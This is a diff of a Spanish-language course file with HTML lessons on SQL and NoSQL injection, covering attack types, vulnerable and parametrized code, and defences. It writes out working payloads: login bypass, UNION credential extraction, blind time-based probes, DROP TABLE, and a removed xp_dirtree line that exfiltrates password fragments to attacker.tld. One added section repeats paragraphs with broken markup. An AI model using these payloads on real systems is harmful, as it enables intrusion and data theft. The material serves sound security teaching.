-        <pre><code class="language-js">// Entrada:
-    let username = req.body.user; // "invent"
-    db.collection('accounts').find({ username: username });</code></pre>
-        <p>
-          Si el atacante envía <code>{"$ne": null}</code> (o <code>username[$ne]=null</code>), la condición se vuelve siempre verdadera y puede devolver todos los usuarios
-          (inyección NoSQL por operadores especiales).
-        </p>
+db.query(consulta);
+</code></pre>
 
-        <h2>Ejemplos seguros</h2>
-        <h3>Solución 1 – Autenticación segura (PHP con PDO)</h3>
-        <pre><code class="language-php">$username = $_POST['user'];
-    $password = $_POST['pass'];
-    $sql = "SELECT * FROM users WHERE username = :user AND password = :pass";
-    $stmt = $pdo->prepare($sql);
-    $stmt->execute(['user' => $username, 'pass' => $password]);
-    $result = $stmt->fetchAll();</code></pre>
-        <p>
-          Los parámetros <code>:user</code> y <code>:pass</code> separan datos del código SQL, neutralizando comillas, comentarios y agregados maliciosos.
-        </p>
+<p>
+En este ejemplo, la variable consulta contiene tanto la estructura fija de la instrucción SQL como los valores recibidos desde el formulario. El problema está en que <code>usuario</code> y <code>contrasena</code> se insertan directamente entre comillas simples dentro de la consulta. Si el usuario introduce valores normales, como <code>"carlos"</code> y <code>"Segura123"</code>, la instrucción resultante será similar a:
+</p>
 
-        <h3>Solución 2 – Búsqueda segura (Validación en NoSQL)</h3>
-        <pre><code class="language-js">let username = req.body.user;
-    if (typeof username !== 'string' || username.match(/[$]/)) {
-      throw new Error("Entrada de usuario no válida");
-    }
-    db.collection('accounts').find({ username });</code></pre>
-        <p>
-          Valida tipo y formato, bloqueando operadores (<code>$ne</code>, etc.). Idealmente usa APIs/ORM que parametrizan internamente.
-        </p>
+<pre><code class="language-html highlight-vulnerable">SELECT * FROM usuarios
+WHERE usuario = 'carlos'
+AND contrasena = 'Segura123'
+</code></pre>
 
-        <div class="info-box">
-          <p><strong>Regla de oro:</strong> Parametriza consultas siempre que sea posible. Para elementos estructurales (p. ej., nombres de tabla) usa listas blancas o rediseña.</p>
-        </div>
+<p>
+La base de datos interpreta esta consulta sin problemas. Sin embargo, nada impide que el campo <code>usuario</code> contenga caracteres especiales o fragmentos completos de SQL.
+</p>
 
-        <h2>Errores comunes</h2>
-        <ul>
-          <li>Concatenar strings para armar SQL.</li>
-          <li>No validar datos de entrada (p. ej., id no numéricos que inyectan <code>OR 1=1</code>).</li>
-          <li>Exponer mensajes de error detallados al usuario (filtración de pistas).</li>
-          <li>Usar credenciales de BD con privilegios excesivos (root/admin).</li>
-          <li>Creer que NoSQL/ORMs modernos son inmunes si se usan con concatenación manual.</li>
-        </ul>
+<h3>Alteración del significado de la consulta</h3>
 
-        <h2>Buenas prácticas</h2>
-        <ul>
-          <li><strong>Parametriza siempre:</strong> Prepared Statements en Java, <code>SqlCommand</code> con parámetros en .NET, PDO/MySQLi en PHP, drivers/ORM en Python, etc.</li>
-          <li><strong>Valida entrada en servidor:</strong> Tipos correctos, rangos y listas blancas de caracteres.</li>
-          <li><strong>Gestiona errores:</strong> Registra detalles en servidor; muestra mensajes genéricos al usuario.</li>
-          <li><strong>Mínimo privilegio en BD:</strong> Cuentas con permisos estrictamente necesarios.</li>
-          <li><strong>Actualiza software y usa ORM correctamente:</strong> Evita SQL nativo concatenado; si es necesario, usa parámetros del ORM/driver.</li>
-        </ul>
+<p>
+La inyección ocurre cuando el atacante introduce un valor que rompe la estructura esperada de la consulta y añade nuevas condiciones o instrucciones. Por ejemplo, si en el campo <code>usuario</code> se introduce el texto:
+</p>
 
-        <h2>Resumen</h2>
-        <p>
-          La inyección SQL explota la mezcla insegura de datos y código en consultas. Vimos cómo entradas maliciosas alteran SQL y cómo prevenirlo mediante
-          <strong>consultas parametrizadas</strong>, <strong>validación</strong>, manejo cuidadoso de errores y <strong>mínimo privilegio</strong>.
-          Estas bases preparan para profundizar en tipos de inyección y defensas avanzadas.
-        </p>
+<pre><code class="language-html highlight-vulnerable">admin' OR '1'='1
+</code></pre>
+
+<p>
+y se mantiene una <code>contrasena</code> cualquiera, la consulta resultante será:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">SELECT * FROM usuarios
+WHERE usuario = 'admin' OR '1'='1'
+AND contrasena = 'loquesea'
+</code></pre>
+
+<p>
+En la práctica, la forma en que el motor evalúe esta condición puede permitir que la cláusula <code>OR</code> haga verdadera la condición completa. Si la consulta no está correctamente agrupada, el motor puede devolver filas independientemente de la contraseña real. El atacante no ha "adivinado" una contraseña, sino que ha modificado la lógica de autenticación para que acepte una condición que siempre se cumple.
+</p>
+
+<p>
+Este ejemplo ilustra el núcleo de la inyección SQL: el texto enviado por el usuario deja de ser un valor y pasa a formar parte de la lógica de la consulta. La base de datos no distingue que una parte proviene de un formulario, solo ve una cadena SQL válida que ejecuta de acuerdo con sus reglas.
+</p>
+
+<h3>Alcance del riesgo</h3>
+
+<p>
+La inyección SQL no se limita a eludir autenticaciones. Dependiendo de los permisos con los que se ejecute la aplicación, un atacante puede leer información a la que no debería tener acceso, modificar registros existentes, insertar nuevos datos o eliminar tablas completas. En algunos motores de base de datos también es posible invocar funciones del sistema operativo, lo que eleva la vulnerabilidad desde un problema de aplicación a un compromiso casi total del servidor.
+</p>
+
+<p>
+Por ejemplo, si la aplicación ejecuta consultas con una cuenta de base de datos que tiene permisos de administrador, una inyección en una simple página de búsqueda puede utilizarse para listar tablas internas, acceder a datos personales de otros usuarios o alterar estados de pedidos. La gravedad del ataque no depende solo de la consulta vulnerable, sino también de los privilegios asociados a la conexión.
+</p>
+
+<p>
+Incluso cuando el atacante no consigue modificar datos, la capacidad de leer tablas sensibles, como usuarios, direcciones de correo, órdenes de compra o registros médicos, constituye una violación grave de confidencialidad.
+</p>
+<div class="warning-box">
+<h4>Factores que favorecen la aparición de inyección SQL</h4>
+
+<p>
+La inyección SQL aparece con más facilidad en aplicaciones que:
+</p>
+<ul>
+<li>
+Aceptan entradas de usuario sin validación de formato.
+</li>
+<li>
+Construyen consultas concatenando cadenas de texto.
+</li>
+<li>
+Reutilizan cuentas de base de datos con privilegios demasiado amplios.
+</li>
+<li>
+Carecen de una capa clara que separe la lógica de negocio del acceso a datos.
+</li>
+</ul>
+</div>
+<p>
+En muchos casos, la vulnerabilidad no se debe a un único error, sino a una combinación de decisiones de diseño. Por ejemplo, un módulo que utiliza concatenación de cadenas puede no ser peligroso si todos los valores se generan internamente. Sin embargo, cuando se reutiliza la misma función para procesar datos provenientes de formularios, enlaces o parámetros de consulta, se introduce un canal directo entre el usuario y el intérprete SQL.
+</p>
+
+<h3>Contraste con una construcción segura básica</h3>
+
+<p>
+Aunque las técnicas de mitigación se estudian con más detalle en lecciones posteriores, resulta útil mostrar el contraste entre la construcción vulnerable y un enfoque más seguro. La idea general consiste en separar la consulta de los valores, de modo que el motor trate siempre los datos del usuario como parámetros y no como parte del código.
+</p>
+
+<p>
+Reutilizan cuentas de base de datos con privilegios demasiado amplios.
+</p>
+
+<p>
+Carecen de una capa clara que separe la lógica de negocio del acceso a datos.
+</p>
+</ul>
+</div>
+<p>
+En muchos casos, la vulnerabilidad no se debe a un único error, sino a una combinación de decisiones de diseño. Por ejemplo, un módulo que utiliza concatenación de cadenas puede no ser peligroso si todos los valores se generan internamente. Sin embargo, cuando se reutiliza la misma función para procesar datos provenientes de formularios, enlaces o parámetros de consulta, se introduce un canal directo entre el usuario y el intérprete SQL.
+</p>
+
+<h3>Contraste con una construcción segura básica</h3>
+
+<p>
+Aunque las técnicas de mitigación se estudian con más detalle en lecciones posteriores, resulta útil mostrar el contraste entre la construcción vulnerable y un enfoque más seguro. La idea general consiste en separar la consulta de los valores, de modo que el motor trate siempre los datos del usuario como parámetros y no como parte del código.
+</p>
+
+<p>
+Un ejemplo de uso de consultas parametrizadas en un entorno similar al anterior sería:
+</p>
+
+<pre><code class="language-html highlight-secure">const usuario = req.body.usuario;
+const contrasena = req.body.contrasena;
+
+const consulta = "SELECT * FROM usuarios " +
+                 "WHERE usuario = ? AND contrasena = ?";
+
+db.query(consulta, [usuario, contrasena]);
+</code></pre>
+
+<p>
+En este caso, los signos de interrogación indican posiciones de parámetros. La consulta se envía al motor de base de datos de forma separada, y los valores de usuario y contrasena se transmiten como datos. El motor nunca los interpreta como parte de la lógica de la consulta, incluso si contienen comillas o palabras clave de SQL. La diferencia de diseño es pequeña a nivel sintáctico, pero muy importante desde el punto de vista de la seguridad.
+</p>
+
+<h3>Bibliografía</h3>
+<ul>
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Indianapolis, IN, USA: Wiley Publishing, 2011.
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, 2nd ed., Redmond, WA, USA: Microsoft Press, 2003.
+  </li>
+
+  <li>
+    National Institute of Standards and Technology, Database Security Guidelines, [Online]. Available:
+    <a href="https://csrc.nist.gov" target="_blank">
+      https://csrc.nist.gov
+    </a>
+  </li>
+</ul>
       `
     },
     'tipos-sqli': {
       id: 'tipos-sqli',
-      title: 'Tipos de inyección SQL',
-      description: 'Conoce las familias principales de Inyección SQL: in-band, inferencial (blind) y out-of-band, y entiende cómo difieren en visibilidad y método de explotación.',
+      title: 'Tipos de Inyección SQL',
+      description: 'Clasificación de variantes de ataques SQL injection',
       category: 'sqli',
       htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          No todas las inyecciones SQL son iguales; existen diferentes técnicas según el contexto.
-          En este módulo exploramos las principales variantes y sus características: inyecciones <strong>en banda</strong> (feedback directo),
-          <strong>ciegas/inferenciales</strong> (sin revelar datos de forma explícita) y <strong>fuera de banda (OOB)</strong>, además de UNION y segundo orden.
-          Comprenderlas ayuda a reconocer patrones de ataque y a diseñar defensas más completas.
-        </p>
+Las vulnerabilidades de inyección SQL pueden manifestarse de distintas formas según cómo la aplicación procese las entradas del usuario, cómo construya las consultas y qué funcionalidades proporcione el motor de base de datos. Aunque todas comparten el principio fundamental de alterar la lógica de una consulta, cada variante se caracteriza por mecanismos específicos y diferentes niveles de visibilidad para el atacante.
+</p>
 
-        <h2>Explicación</h2>
+<p>
+En esta lección se describen las principales variantes de inyección SQL, explicando su comportamiento, los escenarios en los que suelen aparecer y cómo interactúan con el flujo interno de la aplicación. El objetivo es comprender de manera clara las diferencias entre cada tipo, lo cual resulta esencial para evaluar riesgos durante auditorías o pruebas de seguridad.
+</p>
 
-        <h3>1. Inyección SQL Clásica (En Banda)</h3>
-        <p>
-          El atacante inserta SQL malicioso y obtiene resultados por el mismo canal (la misma respuesta web).
-          Es la más visible: aparecen datos inesperados o errores SQL en la UI.
-          Ejemplos típicos: <code>OR '1'='1</code>, <code>; DROP TABLE users;--</code> o el caso de autenticación del módulo previo (<code>admin'--</code>).
-        </p>
+<h3>Inyección SQL clásica o directa</h3>
 
-        <h3>2. Inyección SQL Basada en Errores</h3>
-        <p>
-          Se aprovechan mensajes de error detallados para extraer información (estructuras, nombres de columnas, valores).
-          Por ejemplo, forzar <code>UNION SELECT columna_inexistente</code> para provocar un error que revele metadatos.
-          Sigue siendo <em>en banda</em> porque la información vuelve en la misma respuesta HTTP.
-        </p>
+<h4>Descripción general</h4>
 
-        <h3>3. Inyección SQL Ciega (Booleana)</h3>
-        <p>
-          No hay salida directa ni errores útiles. El atacante formula preguntas de <em>Sí/No</em> y observa cambios en la respuesta.
-          Ejemplo: <code>?id=5 AND 1=1</code> vs <code>?id=5 AND 1=0</code> para inferir condiciones;
-          después, consultas como <code>SUBSTRING((SELECT usuario FROM usuarios LIMIT 1),1,1)='a'</code> permiten reconstruir datos carácter a carácter.
-        </p>
+<p>
+La forma clásica de inyección SQL aparece cuando el atacante puede manipular directamente la consulta mediante la inserción de comillas, operadores lógicos o fragmentos completos de SQL. En este escenario, la aplicación devuelve resultados visibles o un mensaje de error que permite confirmar el comportamiento del ataque.
+</p>
 
-        <h3>4. Inyección SQL Ciega Basada en Tiempo</h3>
-        <p>
-          Se infiere por retrasos en la respuesta usando funciones como <code>SLEEP()</code> (MySQL),
-          <code>WAITFOR DELAY</code> (SQL Server) o <code>pg_sleep()</code> (PostgreSQL).
-          Si una condición es verdadera, la respuesta tarda más; si es falsa, responde rápido. Así se extrae información de forma silenciosa.
-        </p>
+<p>
+Esta variante suele ser evidente cuando la consulta vulnerable está vinculada a funciones como autenticación, búsqueda o filtrado de registros.
+</p>
 
-        <h3>5. Inyección SQL Basada en UNION</h3>
-        <p>
-          Usa <code>UNION</code> para combinar resultados de consultas y volcar datos de otras tablas en la respuesta legítima.
-          Requiere alinear número y tipos de columnas (técnicas: <code>ORDER BY 1..N</code> para descubrir columnas; luego <code>UNION SELECT</code>).
-          Muy eficaz para exfiltrar información en una sola respuesta.
-        </p>
+<h4>Ejemplo representativo</h4>
 
-        <h3>6. Inyección SQL Fuera de Banda (OOB)</h3>
-        <p>
-          Cuando el canal normal no sirve (no hay feedback ni tiempos fiables), se usan canales alternativos (DNS/HTTP saliente) desde la base de datos.
-          Ejemplos: funciones de red (p. ej., <code>xp_dirtree</code>, <code>UTL_HTTP</code>) para provocar conexiones salientes y filtrar datos.
-          Requiere capacidades extendidas y mala configuración de red.
-        </p>
+<pre><code class="language-html highlight-vulnerable">const consulta = "SELECT * FROM productos WHERE nombre = '" + req.query.busqueda + "'";</code></pre>
 
-        <h3>7. Inyección de Segundo Orden</h3>
-        <p>
-          La carga maliciosa se almacena y se ejecuta después en otro flujo (otro módulo/rol). 
-          Por ejemplo, datos de perfil guardados con contenido peligroso que más tarde se concatenan en una consulta interna.
-          Se detalla más en el módulo de casos avanzados.
-        </p>
+<p>
+Si el usuario escribe:
+</p>
 
-        <h2>Ejemplos vulnerables</h2>
+<pre><code class="language-html highlight-vulnerable">' OR '1'='1</code></pre>
 
-        <h4>• Inyección UNION</h4>
-        <pre><code class="language-text">GET /producto?item=0 UNION SELECT username, password FROM users--</code></pre>
-        <p>
-          Si la consulta original es <code>SELECT nombre, descripcion FROM productos WHERE id = ?</code> y es vulnerable,
-          el atacante puede mezclar resultados y ver credenciales en los campos de la UI.
-        </p>
+<p>
+la consulta resultante devuelve todos los registros. El atacante observa resultados anómalos, lo cual confirma el vector.
+</p>
 
-        <h4>• Inyección Ciega (basada en tiempo, PostgreSQL)</h4>
-        <pre><code class="language-sql">12345' AND (
-      SELECT CASE WHEN PIN_CODE LIKE '1%%'
-            THEN pg_sleep(5) ELSE pg_sleep(0) END
-      FROM cuentas WHERE cuenta=12345
-    )--</code></pre>
-        <p>Un retraso indica coincidencia; respuestas rápidas indican lo contrario. Repetición = extracción gradual.</p>
+<h3>Inyección SQL basada en errores</h3>
 
-        <h4>• Inyección Fuera de Banda (SQL Server, idea simplificada)</h4>
-        <pre><code class="language-sql">'; DECLARE @h CHAR(3) = (SELECT TOP 1 LEFT(password,3) FROM users WHERE username='admin');
-    EXEC('master..xp_dirtree "\\\\' + @h + '.attacker.tld\\share"');--</code></pre>
-        <p>Provoca resolución/red de salida revelando fragmentos de datos en el subdominio solicitado.</p>
+<h4>Descripción general</h4>
 
-        <h2>Ejemplos seguros</h2>
-        <ul>
-          <li><strong>Consultas preparadas/parametrizadas:</strong> Separan datos del código; evitan <code>UNION</code>, booleanos/tiempo y cierres de comillas.</li>
-          <li><strong>Validación de formato/longitud:</strong> Tipos estrictos (números, rangos) y listas blancas para impedir operadores o funciones inesperadas.</li>
-          <li><strong>Manejo de errores:</strong> No exponer mensajes SQL detallados; registrar en servidor y mostrar respuestas genéricas.</li>
-          <li><strong>Monitoreo y límites:</strong> Timeouts, detección de patrones repetitivos, WAF/IDS con reglas para <code>UNION</code>, <code>SLEEP</code>, etc.</li>
-        </ul>
+<p>
+En este tipo de ataque, el atacante provoca que la base de datos genere mensajes de error explícitos. Estos errores revelan detalles internos como nombres de tablas, sintaxis SQL y funciones disponibles. La aplicación muestra el error directamente o devuelve suficientes elementos para inferir la estructura interna.
+</p>
 
-        <h2>Errores comunes</h2>
-        <ul>
-          <li>Subestimar variantes (solo considerar lo visible en banda).</li>
-          <li>Arreglos parciales (proteger un campo y olvidar otros canales: URLs, cookies, cabeceras, APIs).</li>
-          <li>Confiar en ocultación: sin errores visibles aún existe blind SQLi.</li>
-          <li>Ignorar NoSQL/ORM: también existen inyecciones por operadores (<code>$ne</code>, <code>$regex</code>) o consultas crudas en ORMs.</li>
-          <li>Permitir salidas de red desde la BD (facilita OOB).</li>
-        </ul>
+<p>
+Este escenario aparece sobre todo en aplicaciones que muestran errores sin filtrarlos o que manejan excepciones de forma inadecuada.
+</p>
 
-        <h2>Buenas prácticas</h2>
-        <ul>
-          <li><strong>Probar cada tipo:</strong> DAST (p. ej., sqlmap) para booleano/tiempo/union/error en entornos de prueba.</li>
-          <li><strong>Capa de datos centralizada:</strong> Reutilizar utilidades/métodos parametrizados reduce errores.</li>
-          <li><strong>Sanitizar todas las entradas/salidas:</strong> Además de parametrizar, escape defensivo donde aplique.</li>
-          <li><strong>Configurar la BD:</strong> Mínimos privilegios, deshabilitar funciones peligrosas, límites de recursos/timeouts.</li>
-          <li><strong>Defensa en profundidad:</strong> Código seguro + validación + WAF/IDS + monitoreo de consultas anómalas.</li>
-        </ul>
+<h4>Ejemplo representativo</h4>
 
-        <h2>Resumen</h2>
-        <p>
-          Las inyecciones <strong>en banda</strong> (clásica, errores) devuelven información directa; las <strong>ciegas</strong> (booleano, tiempo) la infieren por
-          comportamiento; <strong>UNION</strong> combina resultados para exfiltrar datos y <strong>OOB</strong> usa canales alternativos cuando los normales fallan.
-          Aun con diferencias tácticas, todas explotan la misma raíz: mezclar entrada de usuario con código SQL.
-          La solución universal: <strong>parametrizar</strong> y <strong>validar</strong>, reforzando con ocultación de errores, mínimos privilegios, monitoreo y WAF.
-        </p>
-        <p>
-          En el siguiente módulo veremos fundamentos de SQL y acceso a datos para cimentar el porqué de estas fallas y cómo prevenirlas en detalle.
-        </p>
+<pre><code class="language-html highlight-vulnerable">' ORDER BY 999--</code></pre>
+
+<p>
+En una tabla con pocas columnas, esto puede generar un error indicando que la columna no existe, lo cual permite inferir la cantidad real de columnas.
+</p>
+
+<h3>Inyección SQL ciega basada en booleanos</h3>
+
+<h4>Descripción general</h4>
+
+<p>
+En la inyección SQL ciega, la aplicación no devuelve mensajes de error ni resultados visibles que permitan confirmar directamente la inyección. Sin embargo, el atacante puede deducir el comportamiento de la consulta observando diferencias en la respuesta, como contenido visible o ausencia de resultados.
+</p>
+
+<p>
+La variante basada en booleanos manipula condiciones lógicas que devuelven <code>verdadero</code> o <code>falso</code>. La aplicación responde de manera diferente en cada caso, permitiendo extraer información bit a bit.
+</p>
+
+<h4>Ejemplo representativo</h4>
+
+<p>
+Suponga un parámetro <code>id</code> evaluado así:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">/producto?id=10</code></pre>
+
+<p>
+El atacante prueba:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">/producto?id=10 AND 1=1</code></pre>
+
+<p>
+y luego:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">/producto?id=10 AND 1=2</code></pre>
+
+<p>
+Si las respuestas difieren, la vulnerabilidad queda confirmada.
+</p>
+
+<h3>Inyección SQL ciega basada en tiempo</h3>
+
+<h4>Descripción general</h4>
+
+<p>
+Cuando la aplicación no muestra diferencias en contenido, algunos motores de base de datos permiten consultas que introducen demoras temporales. El atacante observa si la página tarda más en responder y así confirma el estado de la condición ejecutada dentro del servidor.
+</p>
+
+<p>
+Esta variante es común cuando el servidor no revela errores y genera siempre la misma vista, independientemente del resultado de la consulta.
+</p>
+
+<h4>Ejemplo representativo</h4>
+
+<pre><code class="language-html highlight-vulnerable">/producto?id=10 AND SLEEP(5)</code></pre>
+
+<p>
+Si la respuesta tarda notablemente más, se confirma la ejecución de la función.
+</p>
+
+<h3>Inyección SQL mediante unión de consultas</h3>
+
+<h4>Descripción general</h4>
+
+<p>
+La técnica de unión (UNION SQL Injection) permite al atacante combinar el resultado de la consulta legítima con el de otra consulta arbitraria. Cuando la aplicación muestra resultados en pantalla, esta variante permite recuperar datos de otras tablas.
+</p>
+
+<p>
+Este escenario es frecuente en secciones de búsqueda o listados donde el servidor muestra directamente filas devueltas por la consulta.
+</p>
+
+<h4>Ejemplo representativo</h4>
+
+<pre><code class="language-html highlight-vulnerable">SELECT nombre, precio FROM productos WHERE categoria = 'electronica'</code></pre>
+
+<p>
+y el atacante introduce:
+</p>
+
+<pre><code class="language-html highlight-vulnerable">electronica' UNION SELECT usuario, contrasena FROM clientes--</code></pre>
+
+<p>
+lo que podría mostrar información sensible en pantalla.
+</p>
+
+<h3>Inyección SQL fuera de banda</h3>
+
+<h4>Descripción general</h4>
+
+<p>
+En este tipo de ataque, el atacante no observa resultados directos ni retrasos temporales. En su lugar, utiliza funciones del motor de base de datos que generan efectos externos, como solicitudes <code>DNS</code> o <code>HTTP</code> hacia un servidor que controla. Cuando la aplicación ejecuta la consulta manipulada, el atacante monitorea si su servidor recibe dichas solicitudes, lo cual confirma la vulnerabilidad y en algunos casos filtra datos.
+</p>
+
+<p>
+Esta variante aparece en motores que permiten llamadas externas, como en ciertos casos de <i>Microsoft SQL Server</i> u <i>Oracle</i>.
+</p>
+
+<h4>Ejemplo representativo</h4>
+
+<p>
+El atacante emplea una función que intenta resolver un nombre <code>DNS</code> externo. Si su servidor recibe la consulta, confirma que la instrucción se ejecutó dentro de la base de datos.
+</p>
+
+<h3>Bibliografía</h3>
+
+<ul>
+  <li>
+    OWASP Foundation, SQL Injection, [Online]. Available:
+    <a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">
+      https://owasp.org/www-community/attacks/SQL_Injection
+    </a>
+  </li>
+
+  <li>
+    OWASP Foundation, SQL Injection Prevention Cheat Sheet, [Online]. Available:
+    <a href="https://cheatsheetseries.owasp.org" target="_blank">
+      https://cheatsheetseries.owasp.org
+    </a>
+  </li>
+
+  <li>
+    PortSwigger, SQL Injection, [Online]. Available:
+    <a href="https://portswigger.net/web-security/sql-injection" target="_blank">
+      https://portswigger.net/web-security/sql-injection
+    </a>
+  </li>
+
+  <li>
+    M. Howard and D. LeBlanc, <i>Writing Secure Code</i>, 2nd ed., Microsoft Press, 2003.
+  </li>
+
+  <li>
+    D. Stuttard and M. Pinto, <i>The Web Application Hacker’s Handbook</i>, 2nd ed., Wiley Publishing, 2011.
+  </li>
+</ul>
       `
     },
-    'fundamentos-sql-y-acceso': {
-    id: 'fundamentos-sql-y-acceso',
-    title: 'Fundamentos de SQL y Acceso a Datos',
-    description: 'Revisa las bases del lenguaje SQL, cómo las aplicaciones construyen consultas y el papel de drivers y ORMs en la seguridad de las consultas.',
+    'ejemplos-sqli': {
+    id: 'ejemplos-sqli',
+    title: 'Ejemplos y técnicas comunes de explotación',
+    description: 'Payloads, queries y métodos frecuentes utilizados en la inyección SQL.',
     category: 'sqli',
     htmlContent: `
-        <h2>Introducción</h2>
         <p>
-          Para entender mejor la inyección SQL, es necesario conocer cómo funciona SQL y el acceso a bases de datos de forma legítima.
-          En este módulo se revisan los fundamentos del lenguaje SQL, cómo las aplicaciones interactúan con las bases de datos y qué ocurre desde que un usuario envía un dato hasta que la base de datos responde.
-          Se explican conceptos básicos (base de datos relacional, consulta SQL, estructura de una tabla) y los mecanismos de conexión (APIs, drivers) que los lenguajes usan para enviar consultas.
-        </p>
+Cuando una aplicación construye consultas SQL de manera insegura, el atacante puede manipular la entrada para alterar el comportamiento original de la consulta. La explotación de inyección SQL se basa en comprender cómo la aplicación procesa los parámetros y cómo el motor de base de datos interpreta el resultado final. Esta lección presenta ejemplos y técnicas comunes utilizadas durante auditorías y pruebas de penetración, mostrando cómo puede manipularse la consulta para obtener información, alterar registros o forzar cambios en la lógica interna de la aplicación.
+</p>
 
-        <h2>¿Qué es SQL y una base de datos relacional?</h2>
-        <p>
-          SQL (Structured Query Language) es el lenguaje para gestionar y consultar datos en sistemas relacionales (MySQL, PostgreSQL, Oracle, SQL Server).
-          Una base de datos relacional organiza información en <em>tablas</em> con <em>filas</em> (registros) y <em>columnas</em> (campos), por ejemplo una tabla <code>Usuarios</code> con <code>id</code>, <code>nombre</code>, <code>email</code>, <code>password</code>.
-        </p>
-        <p>Operaciones principales (CRUD):</p>
-        <ul>
-          <li><strong>SELECT</strong> (consulta)</li>
-          <li><strong>INSERT</strong> (inserción)</li>
-          <li><strong>UPDATE</strong> (actualización)</li>
-          <li><strong>DELETE</strong> (eliminación)</li>
-        </ul>
-        <p>
-          Existen además sentencias DDL (p. ej., <code>CREATE TABLE</code>) y otras de control de permisos y transacciones. En el contexto de <strong>inyección SQL</strong>, las de manipulación de datos (DML) son las más relevantes.
-        </p>
+<p>
+El objetivo es desglosar la lógica de los <i>payloads</i> utilizados habitualmente, explicar por qué funcionan y analizar el impacto potencial dentro del motor de base de datos.
+</p>
 
-        <h2>Acceso desde una aplicación web</h2>
-        <p>
-          Las aplicaciones se conectan mediante una API o <em>driver</em> con credenciales específicas de la base de datos.
-          Envían comandos SQL como texto (o en forma preparada) y reciben resultados: conjuntos de datos para <code>SELECT</code> o indicadores de éxito para modificaciones.
-          Ejemplos: PHP (mysqli/PDO), Java (JDBC), Python (psycopg2/PyMySQL), .NET (ADO.NET).
-        </p>
+<h3>Manipulación básica de parámetros en consultas vulnerables</h3>
 
-        <h2>Estructura básica de una consulta SELECT</h2>
-        <pre><code class="language-sql">SELECT columnas
-    FROM tabla
-    WHERE condición
-    ORDER BY criterio;</code></pre>
-        <ul>
-          <li><strong>SELECT</strong>: columnas a recuperar (<code>*</code> para todas).</li>
-          <li><strong>FROM</strong>: tabla(s) de origen.</li>
-          <li><strong>WHERE</strong> (opcional): filtro booleado (p. ej., <code>category = 'Garden'</code>).</li>
-          <li><strong>ORDER BY</strong> (opcional): orden del resultado.</li>
-        </ul>
-        <p>
-          Otras cláusulas frecuentes: <code>JOIN</code>, <code>GROUP BY</code>, <code>HAVING</code>. La inyección SQL suele enfocarse en valores de <code>WHERE</code>, aunque también puede afectar nombres de columnas/tablas u otras cláusulas si se inserta entrada del usuario allí.
-        </p>
+<p>
+Un punto de inicio en la explotación consiste en verificar si los parámetros enviados por el usuario afectan la estructura de la consulta. Consideremos un <i>endpoint</i> vulnerable que filtra productos por nombre:
+</p>
 
-        <h2>¿Dónde encaja la entrada del usuario?</h2>
-        <ul>
-          <li>Inicio de sesión: usuario/contraseña en un <code>SELECT</code> de verificación.</li>
-          <li>Búsqueda: texto de búsqueda en la cláusula <code>WHERE</code>.</li>
-          <li>Registro: datos en un <code>INSERT</code>.</li>
-        </ul>
-        <p>Ejemplo (pseudocódigo) <em>inseguro</em> por concatenación:</p>
-        <pre><code class="language-text">consulta = "SELECT * FROM Usuarios WHERE nombre = '" + input_nombre + "'";</code></pre>
-        <p>
-          Si <code>input_nombre</code> contiene una comilla (<code>'</code>), puede cerrar la cadena prematuramente y alterar la sintaxis; este es el principio de la inyección.
-        </p>
+<pre><code class="language-html highlight-vulnerable">const consulta = "SELECT * FROM productos WHERE nombre = '" + req.query.nombre + "'";</code></pre>
 
-        <h2>Cómo interpreta el motor de base de datos</h2>
-        <p>
-          El servidor parsea y planea la consulta (sintaxis, permisos, plan de ejecución). No conoce la “intención” del programador: si recibe
-          <code>WHERE nombre = 'Carlos' OR '1'='1'</code> (verdadero), ejecutará la instrucción y devolverá todas las filas que cumplan la condición resultante.
-        </p>
+<p>
+Si el usuario introduce un nombre legítimo, como:
+</p>
 
-        <h2>Escape histórico vs. prácticas modernas</h2>
-        <p>
-          Antes se usaban funciones de <em>escape</em> (p. ej., duplicar comillas en <code>O''Brian</code>, <code>mysql_real_escape_string()</code>).
-          Confiar en escape manual es propenso a errores; por ello se recomiendan <strong>consultas parametrizadas</strong> como enfoque estándar.
-        </p>
+<pre><code class="language-html">Laptop</code></pre>
 
-        <h2>Acceso a datos moderno con ORMs</h2>
-        <p>
-          Los ORMs (Hibernate, Entity Framework, Django ORM, SQLAlchemy) permiten manipular datos con objetos y suelen parametrizar internamente, reduciendo el riesgo de inyección SQL si se usan correctamente.
-          Aun así, conocer SQL ayuda a entender las consultas generadas y evitar introducir texto crudo inseguro.
-        </p>
+<p>
+la consulta generada será:
+</p>
 
-        <h2>Ejemplos vulnerables</h2>
-        <h3>Búsqueda de usuario por email (Python + sqlite3)</h3>
-        <pre><code class="language-python">import sqlite3
-    conn = sqlite3.connect('miapp.db')
-    email = input("Ingrese su email: ")
-    query = f"SELECT * FROM usuarios WHERE email = '{email}'"
-    cursor = conn.execute(query)
-    resultados = cursor.fetchall()</code></pre>
-        <p>
-          Si el usuario ingresa <code>algo' OR '1'='1</code>, la consulta se vuelve:
-        </p>
-        <pre><code class="language-sql">SELECT * FROM usuarios WHERE email = 'algo' OR '1'='1';</code></pre>
-        <p>La condición siempre es verdadera y devuelve todos los usuarios.</p>
+<pre><code class="language-html">SELECT * FROM productos WHERE nombre = 'Laptop'</code></pre>
 
-        <h3>Creación de tabla con nombre dinámico (Java)</h3>
-        <pre><code class="language-java">String tableName = userInput;
-    Statement stmt = connection.createStatement();
-    stmt.executeUpdate("CREATE TABLE " + tableName + " (id INT)");</code></pre>
-        <p>Entrada maliciosa: <code>secure; DROP TABLE usuarios;--</code> &rarr; <em>consultas apiladas</em> con efectos destructivos.</p>
+<p>
+Sin embargo, si el parámetro incluye una comilla y una condición adicional:
+</p>
 
